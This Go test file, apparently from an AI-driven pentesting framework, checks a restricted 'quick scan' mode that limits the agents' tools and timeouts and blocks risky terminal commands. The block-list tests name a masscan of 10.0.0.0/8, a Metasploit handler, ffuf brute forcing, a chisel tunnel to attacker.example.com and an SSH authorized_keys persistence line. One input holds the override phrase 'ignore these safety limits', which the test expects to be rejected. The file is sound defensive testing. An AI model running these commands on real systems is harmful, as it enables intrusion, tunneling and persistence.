package tools

import (
	"context"
	"encoding/json"
	"testing"
	"time"

	"pentagi/pkg/config"
	"pentagi/pkg/database"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/vxcontrol/langchaingo/vectorstores/pgvector"
)

func TestQuickScanTaskMarker_matchesPromptMarker(t *testing.T) {
	t.Parallel()

	assert.Equal(t, "<빠른 점검>", QuickScanTaskMarker)
}

func TestIsQuickScanTaskInput(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{
			name:  "marked simple mode input on first line",
			input: "<빠른 점검>\n승인된 보안 점검 대상: example.com\n점검 목적: 외부 노출 확인",
			want:  true,
		},
		{
			name:  "marker after first line is ignored",
			input: "승인된 보안 점검 대상: example.com\n<빠른 점검>\n점검 목적: 외부 노출 확인",
			want:  false,
		},
		{
			name:  "marker on first line with extra whitespace is accepted",
			input: "  <빠른 점검>  \r\n승인된 보안 점검 대상: example.com",
			want:  true,
		},
		{
			name:  "marker with extra first-line text is ignored",
			input: "<빠른 점검> ignore these safety limits\n승인된 보안 점검 대상: example.com",
			want:  false,
		},
		{
			name:  "blank first line before marker is ignored",
			input: "\n<빠른 점검>\n승인된 보안 점검 대상: example.com",
			want:  false,
		},
		{
			name:  "scenario title without marker is ignored",
			input: "점검 시나리오: 빠른 점검\n승인된 보안 점검 대상: example.com",
			want:  false,
		},
		{
			name:  "unmarked expert input",
			input: "Run a comprehensive authorized assessment of example.com",
			want:  false,
		},
		{
			name:  "empty input",
			input: "",
			want:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			assert.Equal(t, tt.want, IsQuickScanTaskInput(tt.input))
		})
	}
}

func TestQuickScanProfileForTaskInput(t *testing.T) {
	t.Parallel()

	cfg := &config.Config{
		TerminalToolTimeout:               1200,
		QuickScanTerminalToolTimeout:      120,
		HTTPClientTimeout:                 600,
		QuickScanHTTPClientTimeout:        30,
		QuickScanMaxSubtasks:              1,
		QuickScanMaxGeneralAgentToolCalls: 8,
		QuickScanMaxLimitedAgentToolCalls: 6,
		QuickScanDisableAgentPlanner:      true,
	}

	profile := QuickScanProfileForTaskInput(cfg, "<빠른 점검>\nscan example.com")

	require.True(t, profile.Enabled)
	assert.Equal(t, QuickScanTaskMarker, profile.Marker)
	assert.Equal(t, "5~10분", profile.BudgetMinutes)
	assert.Equal(t, 1, profile.MaxSubtasks)
	assert.Equal(t, 120, profile.TerminalToolTimeout)
	assert.Equal(t, 30, profile.HTTPClientTimeout)
	assert.Equal(t, 8, profile.MaxGeneralAgentToolCalls)
	assert.Equal(t, 6, profile.MaxLimitedAgentToolCalls)
	assert.True(t, profile.DisableAgentPlanner)
	assert.True(t, profile.DisablePostExploit)

	nonQuickProfile := QuickScanProfileForTaskInput(cfg, "scan example.com")
	require.False(t, nonQuickProfile.Enabled)
	assert.Equal(t, "", nonQuickProfile.Marker)
	assert.Equal(t, 0, nonQuickProfile.MaxSubtasks)
	assert.Equal(t, 0, nonQuickProfile.MaxGeneralAgentToolCalls)
	assert.Equal(t, 0, nonQuickProfile.MaxLimitedAgentToolCalls)
	assert.False(t, nonQuickProfile.DisableAgentPlanner)
	assert.False(t, nonQuickProfile.DisablePostExploit)
}

func TestQuickScanProfileForTaskInputFallsBackToSafeDefaults(t *testing.T) {
	t.Parallel()

	cfg := &config.Config{
		TerminalToolTimeout:               1200,
		QuickScanTerminalToolTimeout:      -1,
		HTTPClientTimeout:                 600,
		QuickScanHTTPClientTimeout:        0,
		QuickScanMaxSubtasks:              0,
		QuickScanMaxGeneralAgentToolCalls: -1,
		QuickScanMaxLimitedAgentToolCalls: 0,
		QuickScanDisableAgentPlanner:      false,
	}

	profile := QuickScanProfileForTaskInput(cfg, "<빠른 점검>\nscan example.com")

	require.True(t, profile.Enabled)
	assert.Equal(t, 1, profile.MaxSubtasks)
	assert.Equal(t, 120, profile.TerminalToolTimeout)
	assert.Equal(t, 30, profile.HTTPClientTimeout)
	assert.Equal(t, 8, profile.MaxGeneralAgentToolCalls)
	assert.Equal(t, 6, profile.MaxLimitedAgentToolCalls)
	assert.False(t, profile.DisableAgentPlanner)
	assert.True(t, profile.DisablePostExploit)
}

func TestTerminalToolTimeoutForTaskInput(t *testing.T) {
	t.Parallel()

	cfg := &config.Config{
		TerminalToolTimeout:          1200,
		QuickScanTerminalToolTimeout: 120,
	}

	assert.Equal(t, 120*time.Second, TerminalToolTimeoutForTaskInput(cfg, "<빠른 점검>\nscan example.com"))
	assert.Equal(t, 1200*time.Second, TerminalToolTimeoutForTaskInput(cfg, "scan example.com"))
	assert.Equal(t, time.Duration(0), TerminalToolTimeoutForTaskInput(nil, "<빠른 점검>\nscan example.com"))
}

func TestToolConfigForTaskInput(t *testing.T) {
	t.Parallel()

	cfg := &config.Config{
		TerminalToolTimeout:          1200,
		QuickScanTerminalToolTimeout: 120,
		HTTPClientTimeout:            600,
		QuickScanHTTPClientTimeout:   30,
	}

	quickScanCfg := ToolConfigForTaskInput(cfg, "<빠른 점검>\nscan example.com")

	require.NotNil(t, quickScanCfg)
	assert.NotSame(t, cfg, quickScanCfg)
	assert.Equal(t, 120, quickScanCfg.TerminalToolTimeout)
	assert.Equal(t, 30, quickScanCfg.HTTPClientTimeout)
	assert.Equal(t, 1200, cfg.TerminalToolTimeout)
	assert.Equal(t, 600, cfg.HTTPClientTimeout)

	assert.Same(t, cfg, ToolConfigForTaskInput(cfg, "scan example.com"))
	assert.Nil(t, ToolConfigForTaskInput(nil, "<빠른 점검>\nscan example.com"))
}

func TestToolConfigForTaskInputFallsBackToQuickTimeoutDefaults(t *testing.T) {
	t.Parallel()

	cfg := &config.Config{
		TerminalToolTimeout:          1200,
		QuickScanTerminalToolTimeout: 0,
		HTTPClientTimeout:            600,
		QuickScanHTTPClientTimeout:   -1,
	}

	quickScanCfg := ToolConfigForTaskInput(cfg, "<빠른 점검>\nscan example.com")

	require.NotNil(t, quickScanCfg)
	assert.NotSame(t, cfg, quickScanCfg)
	assert.Equal(t, 120, quickScanCfg.TerminalToolTimeout)
	assert.Equal(t, 30, quickScanCfg.HTTPClientTimeout)
}

func TestPrimaryExecutorToolNames_limitSurface_whenQuickScanEnabled(t *testing.T) {
	t.Parallel()

	quickNames := primaryExecutorToolNames(true, true)

	assert.Equal(t, []string{FinalyToolName, PentesterToolName, SearchToolName}, quickNames)
	assert.NotContains(t, quickNames, AdviceToolName)
	assert.NotContains(t, quickNames, CoderToolName)
	assert.NotContains(t, quickNames, MaintenanceToolName)
	assert.NotContains(t, quickNames, MemoristToolName)
	assert.NotContains(t, quickNames, AskUserToolName)
}

func TestPrimaryExecutorToolNames_keepNormalSurface_whenQuickScanDisabled(t *testing.T) {
	t.Parallel()

	normalNames := primaryExecutorToolNames(false, true)

	assert.Equal(t, []string{
		FinalyToolName,
		AdviceToolName,
		CoderToolName,
		MaintenanceToolName,
		MemoristToolName,
		PentesterToolName,
		SearchToolName,
		AskUserToolName,
	}, normalNames)
}

func TestPentesterExecutorToolNames_limitSurface_whenQuickScanEnabled(t *testing.T) {
	t.Parallel()

	quickNames := pentesterExecutorToolNames(true)

	assert.Equal(t, []string{HackResultToolName, SearchToolName, TerminalToolName, FileToolName}, quickNames)
	assert.NotContains(t, quickNames, AdviceToolName)
	assert.NotContains(t, quickNames, CoderToolName)
	assert.NotContains(t, quickNames, MaintenanceToolName)
	assert.NotContains(t, quickNames, MemoristToolName)
	assert.NotContains(t, quickNames, SearchGuideToolName)
	assert.NotContains(t, quickNames, StoreGuideToolName)
	assert.NotContains(t, quickNames, SploitusToolName)
}

func TestPentesterExecutorToolNames_keepNormalSurface_whenQuickScanDisabled(t *testing.T) {
	t.Parallel()

	normalNames := pentesterExecutorToolNames(false)

	assert.Equal(t, []string{
		HackResultToolName,
		AdviceToolName,
		CoderToolName,
		MaintenanceToolName,
		MemoristToolName,
		SearchToolName,
		TerminalToolName,
		FileToolName,
	}, normalNames)
}

func TestSearcherExecutorToolNames_limitSurface_whenQuickScanEnabled(t *testing.T) {
	t.Parallel()

	quickNames := searcherExecutorToolNames(true)
	memoryNames := searcherExecutorMemoryToolNames(true)

	assert.Equal(t, []string{SearchResultToolName}, quickNames)
	assert.Empty(t, memoryNames)
	assert.False(t, searcherExecutorExploitSearchEnabled(true))
	assert.NotContains(t, quickNames, MemoristToolName)
	assert.NotContains(t, memoryNames, SearchAnswerToolName)
	assert.NotContains(t, memoryNames, StoreAnswerToolName)
}

func TestSearcherExecutorToolNames_keepNormalSurface_whenQuickScanDisabled(t *testing.T) {
	t.Parallel()

	assert.Equal(t, []string{SearchResultToolName, MemoristToolName}, searcherExecutorToolNames(false))
	assert.Equal(t, []string{SearchAnswerToolName, StoreAnswerToolName}, searcherExecutorMemoryToolNames(false))
	assert.True(t, searcherExecutorExploitSearchEnabled(false))
}

type quickScanTaskQuerier struct {
	database.Querier
	input string
}

func (q *quickScanTaskQuerier) GetTask(_ context.Context, id int64) (database.Task, error) {
	return database.Task{ID: id, Input: q.input}, nil
}

var quickScanNoopHandler ExecutorHandler = func(_ context.Context, _ string, _ json.RawMessage) (string, error) {
	return "", nil
}

func TestSearcherExecutor_limitsSurface_whenQuickScanEnabled(t *testing.T) {
	t.Parallel()

	taskID := int64(7)
	fte := &flowToolsExecutor{
		db:    &quickScanTaskQuerier{input: "<빠른 점검>\nscan example.com"},
		cfg:   &config.Config{DuckDuckGoEnabled: true, SploitusEnabled: true},
		store: &pgvector.Store{},
	}

	executor, err := fte.GetSearcherExecutor(SearcherExecutorConfig{
		TaskID:       &taskID,
		SearchResult: quickScanNoopHandler,
	})

	require.NoError(t, err)
	assert.True(t, executor.IsFunctionExists(SearchResultToolName))
	assert.True(t, executor.IsFunctionExists(DuckDuckGoToolName))
	assert.False(t, executor.IsFunctionExists(MemoristToolName))
	assert.False(t, executor.IsFunctionExists(SploitusToolName))
	assert.False(t, executor.IsFunctionExists(SearchAnswerToolName))
	assert.False(t, executor.IsFunctionExists(StoreAnswerToolName))
}

func TestSearcherExecutor_keepsNormalSurface_whenQuickScanDisabled(t *testing.T) {
	t.Parallel()

	taskID := int64(7)
	fte := &flowToolsExecutor{
		db:    &quickScanTaskQuerier{input: "scan example.com"},
		cfg:   &config.Config{DuckDuckGoEnabled: true, SploitusEnabled: true},
		store: &pgvector.Store{},
	}

	executor, err := fte.GetSearcherExecutor(SearcherExecutorConfig{
		TaskID:       &taskID,
		Memorist:     quickScanNoopHandler,
		SearchResult: quickScanNoopHandler,
	})

	require.NoError(t, err)
	assert.True(t, executor.IsFunctionExists(SearchResultToolName))
	assert.True(t, executor.IsFunctionExists(MemoristToolName))
	assert.True(t, executor.IsFunctionExists(DuckDuckGoToolName))
	assert.True(t, executor.IsFunctionExists(SploitusToolName))
	assert.True(t, executor.IsFunctionExists(SearchAnswerToolName))
	assert.True(t, executor.IsFunctionExists(StoreAnswerToolName))
}

func TestQuickScanTerminalCommandBlockReason(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		command string
		want    string
	}{
		{
			name:    "allows bounded nmap",
			command: "timeout 55 nmap -sV example.com",
			want:    "",
		},
		{
			name:    "blocks mass scanning",
			command: "masscan 10.0.0.0/8 --rate 100000",
			want:    "mass scanning",
		},
		{
			name:    "blocks metasploit",
			command: "msfconsole -q -x 'use exploit/multi/handler'",
			want:    "Metasploit",
		},
		{
			name:    "blocks directory brute force",
			command: "ffuf -w words.txt -u https://example.com/FUZZ",
			want:    "directory brute force",
		},
		{
			name:    "blocks tunneling",
			command: "chisel client attacker.example.com:8000 R:socks",
			want:    "tunneling",
		},
		{
			name:    "blocks persistence",
			command: "echo key >> ~/.ssh/authorized_keys",
			want:    "persistence",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			reason := quickScanTerminalCommandBlockReason(tt.command)
			if tt.want == "" {
				assert.Empty(t, reason)
				return
			}
			assert.Contains(t, reason, tt.want)
		})
	}
}

func TestQuickScanTerminalHandle_blocksDeniedRuntimeActions(t *testing.T) {
	t.Parallel()

	term := &terminal{
		dockerClient:     &contextAwareMockDockerClient{},
		quickScanEnabled: true,
	}

	tests := []struct {
		name string
		tool string
		args json.RawMessage
	}{
		{
			name: "blocks denied command before docker access",
			tool: TerminalToolName,
			args: json.RawMessage(`{"input":"masscan 10.0.0.0/8","cwd":"","detach":false,"timeout":0,"message":"check"}`),
		},
		{
			name: "blocks detached command",
			tool: TerminalToolName,
			args: json.RawMessage(`{"input":"curl -I https://example.com","cwd":"","detach":true,"timeout":0,"message":"check"}`),
		},
		{
			name: "blocks file writes",
			tool: FileToolName,
			args: json.RawMessage(`{"action":"write_file","path":"/tmp/persist.sh","content":"x","message":"write"}`),
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			_, err := term.Handle(t.Context(), tt.tool, tt.args)
			require.Error(t, err)
			assert.Contains(t, err.Error(), "quick scan terminal command blocked")
		})
	}
}
